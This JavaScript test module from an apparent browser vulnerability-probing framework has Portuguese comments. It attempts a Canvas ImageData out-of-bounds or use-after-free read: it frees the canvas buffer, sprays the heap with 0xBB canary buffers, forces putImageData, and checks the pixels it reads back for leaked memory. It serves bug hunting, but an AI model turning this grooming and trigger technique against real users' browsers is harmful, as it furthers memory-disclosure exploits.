import { Groomer } from '../mod_groomer.js';

export default {
    id:       'CANVAS_IMAGEDATA_OOB',
    category: 'Graphics',
    risk:     'HIGH',
    description:
        'Out-of-Bounds Read/Write na memória do Canvas (ImageBuffer). Cria um ImageData gigante. ' +
        'Encolhe o canvas sincronicamente para 1x1 (destruindo o buffer C++ original) e força ' +
        'a pintura dos dados gigantes. O C++ pode falhar a verificação de limites (Bounds Check).',

    setup: function() {
        this.results = {};
        this.sandbox = document.getElementById('groomer-sandbox');
        
        this.canvas = document.createElement('canvas');
        this.canvas.width = 500;
        this.canvas.height = 500;
        this.sandbox.appendChild(this.canvas);
        
        this.ctx = this.canvas.getContext('2d', { willReadFrequently: true });
        
        // Criamos o payload de memória (Array massivo)
        this.toxicData = this.ctx.createImageData(500, 500);
        // Preenchemos com 0x41 (A)
        this.toxicData.data.fill(0x41); 
    },

   trigger: function() {
        try {
            // 1. Encolhemos o canvas para 1 pixel (Liberta o buffer C++)
            this.canvas.width = 1; 
            
            // 2. A PROVA DOS NOVE: Plantamos o nosso "Canário" na memória
            // Criamos buffers pesados preenchidos EXATAMENTE com o valor 0xBB (187)
            this.canary = [];
            for(let i = 0; i < 50; i++) {
                let buf = new Uint8Array(1024 * 250);
                buf.fill(0xBB); // 0xBB = 187
                this.canary.push(buf);
            }
            
            // 3. Forçamos o bug (O C++ tenta desenhar na memória libertada)
            this.ctx.putImageData(this.toxicData, 0, 0);
            
            // 4. Lemos o vazamento
            this.results.leaked = this.ctx.getImageData(0, 0, 2, 1);
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        s => s.results.error || 'Pintura Gráfica Aceite',
        
        s => {
            if (s.results.leaked) {
                let pixel = s.results.leaked.data;
                
                // Se o pixel lido for 0 (preto transparente), o C++ defendeu-se (Falso Positivo).
                // Se o pixel lido for 65 (0x41 - os "A"s que pintámos originalmente), o bug falhou.
                
                let r = pixel[0];
                
                // 🚨 A CONFIRMAÇÃO DO BUG 🚨
                if (r === 187) { // 187 é o nosso 0xBB
                    return `🏆 OOB CONFIRMADO! O Canvas leu o ArrayBuffer: 0xBBBBBB`;
                } else if (r !== 0 && r !== 65) {
                    // Leu outra coisa da RAM (Ponteiros ou metadados C++)
                    return `💥 LEAK REAL (Metadados): Leu o valor ${r}`;
                }
            }
            return 0; // Falso Positivo / Seguro
        }
    ], 

    cleanup: function() {
        try { this.canvas.remove(); } catch(e){}
        this.canvas = null;
        this.ctx = null;
        this.toxicData = null;
        this.results = {};
    }
};
